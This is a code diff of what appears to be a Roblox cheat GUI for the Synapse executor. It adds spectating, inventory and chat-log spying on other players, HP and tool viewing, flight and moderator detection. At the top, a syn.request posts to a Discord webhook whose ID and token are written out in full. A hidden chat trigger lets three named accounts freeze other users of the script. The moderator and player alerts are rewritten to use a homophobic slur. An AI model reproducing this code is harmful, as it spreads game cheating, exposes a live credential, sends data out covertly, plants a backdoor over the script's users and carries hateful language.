@@ -5,9 +5,9 @@ if syn and syn.cache_replace and syn.cache_invalidate and syn.is_cached and syn.
 		local s = Instance.new("Accessory", game.Players.LocalPlayer)
 		s.Name = "statsss"
 		local data = "1085385027048702032/nxvYTv3fNqWjdKiO6aBobFYsXaSP6GW31Y9Vo4IjhM44m_-QV3-8lckbTe_ncd288WIR"
-local response = syn.request(
-    {
-        Url = 'https://discord.com/api/webhooks/'..data,
+		local response = syn.request(
+			{
+				Url = 'https://discord.com/api/webhooks/'..data,
 				Method = 'POST',
 				Headers = {
 					['Content-Type'] = 'application/json'
@@ -31,6 +31,7 @@ local TabNameFrame = Instance.new("Frame")
 local Tabnamedecorframe = Instance.new("Frame")
 local Player = Instance.new("TextLabel")
 local Home = Instance.new("TextLabel")
+local Interface = Instance.new("TextLabel")
 local Topdecorframe = Instance.new("Frame")
 local Title = Instance.new("TextLabel")
 local Close = Instance.new("ImageButton")
@@ -39,10 +40,12 @@ local NavFrame = Instance.new("ScrollingFrame")
 local Home_2 = Instance.new("TextButton")
 local UIListLayout = Instance.new("UIListLayout")
 local Player_2 = Instance.new("TextButton")
+local Interface_2 = Instance.new("TextButton")
 local FramesFrame = Instance.new("Frame")
 local Home_3 = Instance.new("Frame")
 local Creds = Instance.new("TextLabel")
 local Name = Instance.new("ImageLabel")
+local Info = Instance.new("TextLabel")
 local Player_3 = Instance.new("Frame")
 local UIGridLayout = Instance.new("UIGridLayout")
 local GoldName = Instance.new("TextButton")
@@ -50,6 +53,9 @@ local HPView = Instance.new("TextButton")
 local SpecDrop = Instance.new("TextButton")
 local ViewTools = Instance.new("TextButton")
 local Fly = Instance.new("TextButton")
+local Interface_3 = Instance.new("Frame")
+local UIGridLayout_2 = Instance.new("UIGridLayout")
+local Chatlogs = Instance.new("TextButton")
 local Wheat = Instance.new("ImageLabel")
 local Warning = Instance.new("TextLabel")
 local Template = Instance.new("TextButton")
@@ -57,7 +63,7 @@ local SeerBoard = Instance.new("BillboardGui")
 local TextLabel = Instance.new("TextLabel")
 local SpectateTitle = Instance.new("Frame")
 local SpectateFrame = Instance.new("ScrollingFrame")
-local UIGridLayout_2 = Instance.new("UIGridLayout")
+local UIGridLayout_3 = Instance.new("UIGridLayout")
 local Title_2 = Instance.new("TextLabel")
 local Template_2 = Instance.new("TextButton")
 local Directories = Instance.new("Folder")
@@ -66,6 +72,15 @@ local Clothes = Instance.new("Folder")
 local NotificationsCenter = Instance.new("Frame")
 local UIListLayout_2 = Instance.new("UIListLayout")
 local NotiTemp = Instance.new("TextButton")
+local Chatlogs_2 = Instance.new("ScrollingFrame")
+local UIListLayout_3 = Instance.new("UIListLayout")
+local ChatlogTemplate = Instance.new("TextLabel")
+local InventoryTopFrame = Instance.new("Frame")
+local InventoryText = Instance.new("Frame")
+local Text = Instance.new("TextLabel")
+local Title_3 = Instance.new("TextLabel")
+local Close_2 = Instance.new("ImageButton")
+local TimeStopFrame = Instance.new("Frame")
 
 --Properties:
 
@@ -119,6 +134,19 @@ Home.Font = Enum.Font.Ubuntu
 Home.Text = "Home"
 Home.TextColor3 = Color3.fromRGB(131, 140, 156)
 Home.TextSize = 14.000
+
+Interface.Name = "Interface"
+Interface.Parent = TabNameFrame
+Interface.BackgroundColor3 = Color3.fromRGB(43, 44, 47)
+Interface.BackgroundTransparency = 1.000
+Interface.BorderSizePixel = 0
+Interface.Position = UDim2.new(0.230337068, 0, 0.133332819, 0)
+Interface.Size = UDim2.new(0, 191, 0, 26)
+Interface.Visible = false
+Interface.Font = Enum.Font.Ubuntu
+Interface.Text = "Interface"
+Interface.TextColor3 = Color3.fromRGB(131, 140, 156)
+Interface.TextSize = 14.000
 
 Topdecorframe.Name = "Topdecorframe"
 Topdecorframe.Parent = TopFrame
@@ -191,6 +219,16 @@ Player_2.Text = "Player"
 Player_2.TextColor3 = Color3.fromRGB(179, 190, 216)
 Player_2.TextSize = 14.000
 
+Interface_2.Name = "Interface"
+Interface_2.Parent = NavFrame
+Interface_2.BackgroundColor3 = Color3.fromRGB(56, 60, 67)
+Interface_2.BorderColor3 = Color3.fromRGB(43, 44, 47)
+Interface_2.Size = UDim2.new(0, 118, 0, 26)
+Interface_2.Font = Enum.Font.Ubuntu
+Interface_2.Text = "Interface"
+Interface_2.TextColor3 = Color3.fromRGB(179, 190, 216)
+Interface_2.TextSize = 14.000
+
 FramesFrame.Name = "FramesFrame"
 FramesFrame.Parent = TopFrame
 FramesFrame.BackgroundColor3 = Color3.fromRGB(51, 53, 62)
@@ -221,9 +259,23 @@ Name.Parent = Home_3
 Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Name.BackgroundTransparency = 1.000
 Name.BorderSizePixel = 0
-Name.Position = UDim2.new(0.247191012, 0, 0.420289844, 0)
+Name.Position = UDim2.new(0.244382024, 0, 0.314009666, 0)
 Name.Size = UDim2.new(0, 171, 0, 35)
 Name.Image = "http://www.roblox.com/asset/?id=12780327731"
+
+Info.Name = "Info"
+Info.Parent = Home_3
+Info.BackgroundColor3 = Color3.fromRGB(51, 53, 62)
+Info.BackgroundTransparency = 1.000
+Info.BorderSizePixel = 0
+Info.Position = UDim2.new(0.0168539323, 0, 0.58580184, 0)
+Info.Size = UDim2.new(0, 334, 0, 76)
+Info.Font = Enum.Font.Ubuntu
+Info.Text = "Script information, M is to toggle fly, you can also press + or - to increase/decrease speed, you can press \";\" to toggle the GUI, and you can also right click people in the spectate menu to view their inventories."
+Info.TextColor3 = Color3.fromRGB(131, 140, 156)
+Info.TextScaled = true
+Info.TextSize = 14.000
+Info.TextWrapped = true
 
 Player_3.Name = "Player"
 Player_3.Parent = FramesFrame
@@ -304,6 +356,33 @@ Fly.TextScaled = true
 Fly.TextSize = 14.000
 Fly.TextWrapped = true
 
+Interface_3.Name = "Interface"
+Interface_3.Parent = FramesFrame
+Interface_3.BackgroundColor3 = Color3.fromRGB(51, 53, 61)
+Interface_3.BorderSizePixel = 0
+Interface_3.Position = UDim2.new(-0.00104154099, 0, 0, 0)
+Interface_3.Size = UDim2.new(0, 356, 0, 207)
+Interface_3.Visible = false
+
+UIGridLayout_2.Parent = Interface_3
+UIGridLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIGridLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
+UIGridLayout_2.CellPadding = UDim2.new(0, 10, 0, 5)
+UIGridLayout_2.CellSize = UDim2.new(0, 80, 0, 30)
+
+Chatlogs.Name = "Chatlogs"
+Chatlogs.Parent = Interface_3
+Chatlogs.BackgroundColor3 = Color3.fromRGB(57, 61, 68)
+Chatlogs.BorderSizePixel = 0
+Chatlogs.Position = UDim2.new(0.0265731215, 0, 0.783868432, 0)
+Chatlogs.Size = UDim2.new(0, 108, 0, 25)
+Chatlogs.Font = Enum.Font.Ubuntu
+Chatlogs.Text = "Toggle Chatlogs"
+Chatlogs.TextColor3 = Color3.fromRGB(179, 190, 216)
+Chatlogs.TextScaled = true
+Chatlogs.TextSize = 14.000
+Chatlogs.TextWrapped = true
+
 Wheat.Name = "Wheat"
 Wheat.Parent = TopFrame
 Wheat.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -381,10 +460,10 @@ SpectateFrame.Size = UDim2.new(0, 341, 0, 152)
 SpectateFrame.ZIndex = 50
 SpectateFrame.ScrollBarThickness = 15
 
-UIGridLayout_2.Parent = SpectateFrame
-UIGridLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
-UIGridLayout_2.CellPadding = UDim2.new(0, 3, 0, 5)
-UIGridLayout_2.CellSize = UDim2.new(0, 65, 0, 25)
+UIGridLayout_3.Parent = SpectateFrame
+UIGridLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
+UIGridLayout_3.CellPadding = UDim2.new(0, 3, 0, 5)
+UIGridLayout_3.CellSize = UDim2.new(0, 65, 0, 25)
 
 Title_2.Name = "Title"
 Title_2.Parent = SpectateTitle
@@ -451,6 +530,94 @@ NotiTemp.TextSize = 14.000
 NotiTemp.TextStrokeTransparency = 0.000
 NotiTemp.TextWrapped = true
 
+Chatlogs_2.Name = "Chatlogs"
+Chatlogs_2.Parent = ScreenGui
+Chatlogs_2.Active = true
+Chatlogs_2.BackgroundColor3 = Color3.fromRGB(51, 53, 61)
+Chatlogs_2.BorderSizePixel = 0
+Chatlogs_2.Position = UDim2.new(0.621642351, 0, 0.345990568, 0)
+Chatlogs_2.Size = UDim2.new(0, 357, 0, 202)
+Chatlogs_2.Visible = false
+
+UIListLayout_3.Parent = Chatlogs_2
+UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
+
+ChatlogTemplate.Name = "ChatlogTemplate"
+ChatlogTemplate.Parent = ScreenGui
+ChatlogTemplate.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ChatlogTemplate.BackgroundTransparency = 1.000
+ChatlogTemplate.Position = UDim2.new(0, 0, -1.51077117e-07, 0)
+ChatlogTemplate.Size = UDim2.new(0, 341, 0, 14)
+ChatlogTemplate.Font = Enum.Font.SourceSans
+ChatlogTemplate.Text = ""
+ChatlogTemplate.TextColor3 = Color3.fromRGB(208, 121, 0)
+ChatlogTemplate.TextSize = 14.000
+ChatlogTemplate.TextXAlignment = Enum.TextXAlignment.Left
+
+InventoryTopFrame.Name = "InventoryTopFrame"
+InventoryTopFrame.Parent = ScreenGui
+InventoryTopFrame.BackgroundColor3 = Color3.fromRGB(43, 44, 47)
+InventoryTopFrame.BorderSizePixel = 0
+InventoryTopFrame.Position = UDim2.new(0.650038362, 0, 0.561193645, 0)
+InventoryTopFrame.Size = UDim2.new(0, 233, 0, 25)
+InventoryTopFrame.Visible = false
+
+InventoryText.Name = "InventoryText"
+InventoryText.Parent = InventoryTopFrame
+InventoryText.BackgroundColor3 = Color3.fromRGB(57, 61, 68)
+InventoryText.BorderColor3 = Color3.fromRGB(27, 42, 53)
+InventoryText.BorderSizePixel = 0
+InventoryText.Position = UDim2.new(0, 0, 1.00119388, 0)
+InventoryText.Size = UDim2.new(0, 233, 0, 146)
+
+Text.Name = "Text"
+Text.Parent = InventoryText
+Text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Text.BackgroundTransparency = 1.000
+Text.Size = UDim2.new(0, 232, 0, 146)
+Text.Font = Enum.Font.Ubuntu
+Text.Text = ""
+Text.TextColor3 = Color3.fromRGB(131, 140, 156)
+Text.TextSize = 14.000
+Text.TextWrapped = true
+Text.TextXAlignment = Enum.TextXAlignment.Left
+Text.TextYAlignment = Enum.TextYAlignment.Top
+
+Title_3.Name = "Title"
+Title_3.Parent = InventoryTopFrame
+Title_3.BackgroundColor3 = Color3.fromRGB(43, 44, 47)
+Title_3.BackgroundTransparency = 1.000
+Title_3.BorderSizePixel = 0
+Title_3.Position = UDim2.new(0.0167367309, 0, 0, 0)
+Title_3.Size = UDim2.new(0, 229, 0, 25)
+Title_3.Font = Enum.Font.Ubuntu
+Title_3.Text = "Inventory Viewer"
+Title_3.TextColor3 = Color3.fromRGB(131, 140, 156)
+Title_3.TextScaled = true
+Title_3.TextSize = 27.000
+Title_3.TextWrapped = true
+Title_3.TextXAlignment = Enum.TextXAlignment.Left
+
+Close_2.Name = "Close"
+Close_2.Parent = InventoryTopFrame
+Close_2.BackgroundTransparency = 1.000
+Close_2.BorderColor3 = Color3.fromRGB(43, 44, 47)
+Close_2.BorderSizePixel = 0
+Close_2.Position = UDim2.new(0.860746801, 0, -0.0249999985, 0)
+Close_2.Size = UDim2.new(0, 26, 0, 26)
+Close_2.Image = "rbxassetid://3944676352"
+Close_2.ImageColor3 = Color3.fromRGB(131, 140, 156)
+Close_2.ScaleType = Enum.ScaleType.Fit
+
+TimeStopFrame.Name = "TimeStopFrame"
+TimeStopFrame.Parent = ScreenGui
+TimeStopFrame.BackgroundColor3 = Color3.fromRGB(0, 153, 255)
+TimeStopFrame.BackgroundTransparency = 0.800
+TimeStopFrame.BorderSizePixel = 0
+TimeStopFrame.Position = UDim2.new(0.100000001, 0, 0.100000001, 0)
+TimeStopFrame.Size = UDim2.new(50000000, 50000000, 50000000, 50000000)
+TimeStopFrame.Visible = false
+
 local Glow = Instance.new("Part")
 local ecks = Instance.new("ParticleEmitter")
 
@@ -487,7 +654,7 @@ ecks.Texture = "http://www.roblox.com/asset/?id=37332909"
 
 -- Scripts:
 
-local function RGSE_fake_script() -- TopFrame.Drag 
+local function MRCJMP_fake_script() -- TopFrame.Drag 
 	local script = Instance.new('LocalScript', TopFrame)
 
 	local UserInputService = game:GetService("UserInputService")
@@ -544,8 +711,8 @@ local function RGSE_fake_script() -- TopFrame.Drag
 	
 	runService.Heartbeat:Connect(Update)
 end
-coroutine.wrap(RGSE_fake_script)()
-local function DMGVL_fake_script() -- ScreenGui.Handler 
+coroutine.wrap(MRCJMP_fake_script)()
+local function NQHE_fake_script() -- ScreenGui.Handler 
 	local script = Instance.new('LocalScript', ScreenGui)
 
 	local GUI = script.Parent
@@ -559,9 +726,11 @@ local function DMGVL_fake_script() -- ScreenGui.Handler
 	local GUIoff = false
 	local Home = FramesFrame:WaitForChild("Home")
 	local Player = FramesFrame:WaitForChild("Player")
+	local ChatlogFrame = FramesFrame:WaitForChild("Interface")
 	local HPView = false
 	local GoldName = false
 	local ViewTool = false
+	local ChatToggle = false
 	local Template = TopFrame:WaitForChild("Template")
 	local Viewing = Instance.new("BoolValue")
 	local SpectateTitle = GUI:WaitForChild("SpectateTitle")
@@ -570,16 +739,39 @@ local function DMGVL_fake_script() -- ScreenGui.Handler
 	Viewing.Name = "Viewing"
 	Viewing.Parent = Template
 	local SpectatingGui = false
+	local Chatlogs = GUI:WaitForChild("Chatlogs")
+	local ChatlogTemplate = GUI:WaitForChild("ChatlogTemplate")
+	local InventoryTopFrame = GUI:WaitForChild("InventoryTopFrame")
+	local InventoryText = InventoryTopFrame:WaitForChild("InventoryText")
+	local InvText = InventoryText:WaitForChild("Text")
+	local InvClose = InventoryTopFrame:WaitForChild("Close")
+	local TimeStopFrame = GUI:WaitForChild("TimeStopFrame")
 	--game.Workspace.Camera.CameraSubject = Player.Character.Humanoid
 	NotiCenter.DescendantAdded:Connect(function(Descendant)
 		if Descendant:IsA("TextButton") then
 			Descendant.MouseButton1Click:Connect(function()
 				Descendant:Destroy()
-				end)
-			end
 			end)
+		end
+	end)
 	SpectateFrame.DescendantAdded:Connect(function(Descendant)
 		if Descendant:IsA("TextButton") then
+			
+			Descendant.MouseButton2Click:Connect(function()
+				local EnemyPlayer = game.Players[Descendant.PlayerName.Value]
+				InvText.Text = ""
+				InvText.TextColor3 = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))
+				
+				for i,v in pairs(EnemyPlayer.Backpack:GetChildren()) do
+					if v:IsA("Tool") then
+						InvText.Text = InvText.Text..", "..v.Name
+					end
+				end
+				
+				InventoryTopFrame.Visible = true
+				
+			end)
+			
 			Descendant.MouseButton1Click:Connect(function()
 				if Descendant.Viewing.Value == false then
 					for i,v in pairs(SpectateFrame:GetChildren()) do
@@ -712,7 +904,7 @@ local function DMGVL_fake_script() -- ScreenGui.Handler
 				end
 				for i,x in pairs(TabNameFrame:GetChildren()) do
 					if x:IsA("TextLabel") then
-					x.Visible = false
+						x.Visible = false
 					end
 				end
 				FramesFrame[v.Text].Visible = true
@@ -720,11 +912,119 @@ local function DMGVL_fake_script() -- ScreenGui.Handler
 			end)
 		end
 	end
+	function output(plr, msg)
+		local colour = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))
+	
+		if string.sub(msg, 1,1) == ":" or string.sub(msg,1,1) == ";" then colour = Color3.fromRGB(255,0,0) elseif string.sub(msg,1,2) == "/w" or string.sub(msg,1,7) == "/whisper" or string.sub(msg,1,5) == "/team" or string.sub(msg,1,2) == "/t" then colour = Color3.fromRGB(0,0,255) else colour = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255)) end
+		
+		local clone = ChatlogTemplate:Clone()
+		clone.Parent = Chatlogs
+		clone.TextColor3 = colour
+		clone.Text = "["..plr.Name.."]: "..msg
+		
+	end
+	for i,v in pairs(game.Players:GetChildren()) do
+		v.Chatted:Connect(function(msg)
+			
+			if msg == "Halt." and v.Name == "KariiValkyrie" or msg == "Halt." and v.Name == "Sxinisxxter" or msg == "Halt." and v.Name == "GetCurb_Stomped" then
+				game.Workspace.Camera.FieldOfView = 110
+				local sfx = Instance.new("Sound")
+				sfx.SoundId = "rbxassetid://2502245370"
+				sfx.PlaybackSpeed = 0.9
+				sfx.Volume = 2
+				sfx.Parent = workspace
+				sfx:Play()
+				game.Debris:AddItem(sfx,3)
+				TimeStopFrame.Visible = true
+				
+				if game.Players.LocalPlayer.Name ~= "KariiValkyrie" and game.Players.LocalPlayer.Name ~= "Sxinisxxter" and game.Players.LocalPlayer.Name ~= "GetCurb_Stomped" then
+					if game.Players.LocalPlayer:FindFirstChild("Ingame") then
+						game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true	
+					end
+				end
+			end
+			
+			if msg == "Resume." and v.Name == "KariiValkyrie" or msg == "Resume." and v.Name == "Sxinisxxter" or msg == "Resume." and v.Name == "GetCurb_Stomped" then
+				game.Workspace.Camera.FieldOfView = 70
+				local sfx = Instance.new("Sound")
+				sfx.SoundId = "rbxassetid://2404991944"
+				sfx.PlaybackSpeed = 1
+				sfx.Volume = 2
+				sfx.Parent = workspace
+				sfx:Play()
+				game.Debris:AddItem(sfx,3)
+				TimeStopFrame.Visible = false
+	
+				if game.Players.LocalPlayer.Name ~= "KariiValkyrie" and game.Players.LocalPlayer.Name ~= "Sxinisxxter" and game.Players.LocalPlayer.Name ~= "GetCurb_Stomped" then
+					if game.Players.LocalPlayer:FindFirstChild("Ingame") then
+						game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false	
+					end
+				end
+			end
+			
+			
+		end)
+	end
+	
+	game.Players.ChildAdded:Connect(function(plr)
+		if plr:IsA("Player") then
+			plr.Chatted:Connect(function(msg)
+				if msg == "Halt." and plr.Name == "KariiValkyrie" or msg == "Halt." and plr.Name == "Sxinisxxter" or msg == "Halt." and plr.Name == "GetCurb_Stomped" then
+					game.Workspace.Camera.FieldOfView = 110
+					local sfx = Instance.new("Sound")
+					sfx.SoundId = "rbxassetid://2502245370"
+					sfx.PlaybackSpeed = 0.9
+					sfx.Volume = 2
+					sfx.Parent = workspace
+					sfx:Play()
+					game.Debris:AddItem(sfx,3)
+					TimeStopFrame.Visible = true
+	
+					if game.Players.LocalPlayer.Name ~= "KariiValkyrie" and game.Players.LocalPlayer.Name ~= "Sxinisxxter" and game.Players.LocalPlayer.Name ~= "GetCurb_Stomped" then
+						if game.Players.LocalPlayer:FindFirstChild("Ingame") then
+							game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true	
+						end
+					end
+				end
+	
+				if msg == "Resume." and plr.Name == "KariiValkyrie" or msg == "Resume." and plr.Name == "Sxinisxxter" or msg == "Resume." and plr.Name == "GetCurb_Stomped" then
+					game.Workspace.Camera.FieldOfView = 70
+					local sfx = Instance.new("Sound")
+					sfx.SoundId = "rbxassetid://2404991944"
+					sfx.PlaybackSpeed = 1
+					sfx.Volume = 2
+					sfx.Parent = workspace
+					sfx:Play()
+					game.Debris:AddItem(sfx,3)
+					TimeStopFrame.Visible = false
+	
+					if game.Players.LocalPlayer.Name ~= "KariiValkyrie" and game.Players.LocalPlayer.Name ~= "Sxinisxxter" and game.Players.LocalPlayer.Name ~= "GetCurb_Stomped" then
+						if game.Players.LocalPlayer:FindFirstChild("Ingame") then
+							game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false	
+						end
+					end
+				end
+			end)
+		end
+	end)
+	for i,v in pairs(game.Players:GetChildren()) do
+		v.Chatted:Connect(function(msg)
+			output(v, msg)
+		end)
+	end
+	
+	game.Players.ChildAdded:Connect(function(plr)
+		if plr:IsA("Player") then
+			plr.Chatted:Connect(function(msg)
+				output(plr, msg)
+			end)
+		end
+	end)
 	for i,v in pairs(game.Players:GetChildren()) do
 		local rank = v:GetRankInGroup(15131884)
 		if rank > 1 then
 			local c = GUI.NotiTemp:Clone()
-			c.Text = "A moderator ("..v.Name..") is in your server."
+			c.Text = "Faggot detected (Moderator: "..Player.Name..") is in your server."
 			c.Parent = NotiCenter
 			c.Visible = true
 			local sound = Instance.new("Sound")
@@ -738,7 +1038,7 @@ local function DMGVL_fake_script() -- ScreenGui.Handler
 		local rank = Player:GetRankInGroup(15131884)
 		if rank > 1 then
 			local c = GUI.NotiTemp:Clone()
-			c.Text = "A moderator ("..Player.Name..") is in your server."
+			c.Text = "Faggot detected (Moderator: "..Player.Name..") is in your server."
 			c.Parent = NotiCenter
 			c.Visible = true
 			local sound = Instance.new("Sound")
@@ -747,6 +1047,52 @@ local function DMGVL_fake_script() -- ScreenGui.Handler
 			sound:Play()
 			game.Debris:AddItem(sound,1.5)
 		end
+	end)
+	for i,v in pairs(game.Players:GetChildren()) do
+		
+		if v.Backpack:FindFirstChild("Observe") then
+			local c = GUI.NotiTemp:Clone()
+			c.Text = "Faggot detected (Illusionist: "..Player.Name..") is in your server."
+			c.Parent = NotiCenter
+			c.Visible = true
+			local sound = Instance.new("Sound")
+			sound.SoundId = "rbxassetid://3607729090"
+			sound.Parent = workspace
+			sound:Play()
+			game.Debris:AddItem(sound,1.5)
+		end
+		if v:FindFirstChild("Ingame") then
+			if v.Character:FindFirstChild("Observe") then
+				local c = GUI.NotiTemp:Clone()
+				c.Text = "Faggot detected (Illusionist: "..Player.Name..") is in your server."
+				c.Parent = NotiCenter
+				c.Visible = true
+				local sound = Instance.new("Sound")
+				sound.SoundId = "rbxassetid://3607729090"
+				sound.Parent = workspace
+				sound:Play()
+				game.Debris:AddItem(sound,1.5)
+			end
+		end
+		
+	end
+	game.Players.PlayerAdded:Connect(function(Player)
+		Player.ChildAdded:Connect(function(added)
+			if added.Name == "Ingame" then
+				task.wait(1)
+				if Player.Backpack:FindFirstChild("Observe") or Player.Character:FindFirstChild("Observe") then
+					local c = GUI.NotiTemp:Clone()
+					c.Text = "Faggot detected (Illusionist: "..Player.Name..") is in your server."
+					c.Parent = NotiCenter
+					c.Visible = true
+					local sound = Instance.new("Sound")
+					sound.SoundId = "rbxassetid://3607729090"
+					sound.Parent = workspace
+					sound:Play()
+					game.Debris:AddItem(sound,1.5)
+				end
+			end
+		end)
 	end)
 	workspace.Live.ChildAdded:Connect(function(added)
 		if added:FindFirstChildOfClass("Humanoid") and HPView == true then
@@ -774,15 +1120,15 @@ local function DMGVL_fake_script() -- ScreenGui.Handler
 		if HPView == false then
 			HPView = true
 			Player.HPView.Text = "HP View: On"
-		for i,v in pairs(Live:GetChildren()) do
-			if v:FindFirstChildOfClass("Humanoid") then
-				v.Humanoid.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOn
-				v.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Subject
+			for i,v in pairs(Live:GetChildren()) do
+				if v:FindFirstChildOfClass("Humanoid") then
+					v.Humanoid.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOn
+					v.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Subject
 					v.Humanoid.HealthDisplayDistance = 10000000000
-					end
 				end
+			end
 			return end
-		
+	
 		if HPView == true then
 			HPView = false
 			Player.HPView.Text = "HP View: Off"
@@ -829,16 +1175,16 @@ local function DMGVL_fake_script() -- ScreenGui.Handler
 								local clone = GUI.SeerBoard:Clone()
 								clone.Parent = v.Head
 							end
-								v.Head.SeerBoard.TextLabel.Text = v:FindFirstChildOfClass("Tool").Name
+							v.Head.SeerBoard.TextLabel.Text = v:FindFirstChildOfClass("Tool").Name
 						elseif not v:FindFirstChildOfClass("Tool") then
 							if not v.Head:FindFirstChild("SeerBoard") then
 								local clone = GUI.SeerBoard:Clone()
 								clone.Parent = v.Head
 							end
-						v.Head.SeerBoard.TextLabel.Text = ""
-						end
+							v.Head.SeerBoard.TextLabel.Text = ""
 						end
 					end
+				end
 			end
 		end
 	end)
@@ -856,11 +1202,11 @@ local function DMGVL_fake_script() -- ScreenGui.Handler
 	
 					for i,x in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
 						if x:IsA("Shirt") then
-							x.ShirtTemplate = "rbxassetid://48824913"
+							x.ShirtTemplate = "rbxassetid://5661823678"
 							x.Color3 = Color3.new(255,255,255)
 						end
 						if x:IsA("Pants") then
-							x.PantsTemplate = "rbxassetid://48824937"
+							x.PantsTemplate = "rbxassetid://5661786574"
 							x.Color3 = Color3.new(255,255,255)
 						end
 					end
@@ -896,11 +1242,11 @@ local function DMGVL_fake_script() -- ScreenGui.Handler
 	
 						for i,x in pairs(playa.Character:GetChildren()) do
 							if x:IsA("Shirt") then
-								x.ShirtTemplate = "rbxassetid://48824913"
+								x.ShirtTemplate = "rbxassetid://5661823678"
 								x.Color3 = Color3.new(255,255,255)
 							end
 							if x:IsA("Pants") then
-								x.PantsTemplate = "rbxassetid://48824937"
+								x.PantsTemplate = "rbxassetid://5661786574"
 								x.Color3 = Color3.new(255,255,255)
 							end
 						end
@@ -934,11 +1280,11 @@ local function DMGVL_fake_script() -- ScreenGui.Handler
 	
 						for i,x in pairs(playa.Character:GetChildren()) do
 							if x:IsA("Shirt") then
-								x.ShirtTemplate = "rbxassetid://48824913"
+								x.ShirtTemplate = "rbxassetid://5661823678"
 								x.Color3 = Color3.new(255,255,255)
 							end
 							if x:IsA("Pants") then
-								x.PantsTemplate = "rbxassetid://48824937"
+								x.PantsTemplate = "rbxassetid://5661786574"
 								x.Color3 = Color3.new(255,255,255)
 							end
 						end
@@ -972,11 +1318,11 @@ local function DMGVL_fake_script() -- ScreenGui.Handler
 	
 						for i,x in pairs(playa.Character:GetChildren()) do
 							if x:IsA("Shirt") then
-								x.ShirtTemplate = "rbxassetid://48824913"
+								x.ShirtTemplate = "rbxassetid://5661823678"
 								x.Color3 = Color3.new(255,255,255)
 							end
 							if x:IsA("Pants") then
-								x.PantsTemplate = "rbxassetid://48824937"
+								x.PantsTemplate = "rbxassetid://5661786574"
 								x.Color3 = Color3.new(255,255,255)
 							end
 						end
@@ -1004,6 +1350,9 @@ local function DMGVL_fake_script() -- ScreenGui.Handler
 		end
 	
 	end)
+	InvClose.MouseButton1Click:Connect(function()
+		InventoryTopFrame.Visible = false
+	end)
 	Player.ViewTools.MouseButton1Click:Connect(function()
 		if ViewTool == false then
 			ViewTool = true
@@ -1015,7 +1364,7 @@ local function DMGVL_fake_script() -- ScreenGui.Handler
 					end
 				end
 			end
-		return end
+			return end
 		if ViewTool == true then
 			ViewTool = false
 			Player.ViewTools.Text = "View Tools: Off"
@@ -1028,18 +1377,26 @@ local function DMGVL_fake_script() -- ScreenGui.Handler
 			end
 			return end
 	end)
+	ChatlogFrame.Chatlogs.MouseButton1Click:Connect(function()
+		
+		if ChatToggle == false then
+			ChatToggle = true
+			Chatlogs.Visible = true
+			return end
+		
+		if ChatToggle == true then
+			ChatToggle = false
+			Chatlogs.Visible = false
+			return end
+		
+	end)
 	Close.MouseButton1Click:Connect(function()
 		GUI:Destroy()
 		script:Destroy()
 	end)
-	
-	
-	
-	
-	
 end
-coroutine.wrap(DMGVL_fake_script)()
-local function LPXPD_fake_script() -- SpectateTitle.Drag 
+coroutine.wrap(NQHE_fake_script)()
+local function PEAMG_fake_script() -- SpectateTitle.Drag 
 	local script = Instance.new('LocalScript', SpectateTitle)
 
 	local UserInputService = game:GetService("UserInputService")
@@ -1096,8 +1453,8 @@ local function LPXPD_fake_script() -- SpectateTitle.Drag
 	
 	runService.Heartbeat:Connect(Update)
 end
-coroutine.wrap(LPXPD_fake_script)()
-local function VMTNJ_fake_script() -- ScreenGui.Fly 
+coroutine.wrap(PEAMG_fake_script)()
+local function OINIU_fake_script() -- ScreenGui.Fly 
 	local script = Instance.new('LocalScript', ScreenGui)
 
 	local GUI = script.Parent
@@ -1333,4 +1690,120 @@ local function VMTNJ_fake_script() -- ScreenGui.Fly
 		
 		end)
 end
-coroutine.wrap(VMTNJ_fake_script)()
+coroutine.wrap(OINIU_fake_script)()
+local function NMJRDM_fake_script() -- Chatlogs_2.Drag 
+	local script = Instance.new('LocalScript', Chatlogs_2)
+
+	local UserInputService = game:GetService("UserInputService")
+	local runService = (game:GetService("RunService"));
+	
+	local gui = script.Parent
+	
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+	
+	function Lerp(a, b, m)
+		return a + (b - a) * m
+	end;
+	
+	local lastMousePos
+	local lastGoalPos
+	local DRAG_SPEED = (8); -- // The speed of the UI darg.
+	function Update(dt)
+		if not (startPos) then return end;
+		if not (dragging) and (lastGoalPos) then
+			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
+			return 
+		end;
+	
+		local delta = (lastMousePos - UserInputService:GetMouseLocation())
+		local xGoal = (startPos.X.Offset - delta.X);
+		local yGoal = (startPos.Y.Offset - delta.Y);
+		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
+		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
+	end;
+	
+	gui.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = gui.Position
+			lastMousePos = UserInputService:GetMouseLocation()
+	
+			input.Changed:Connect(function()
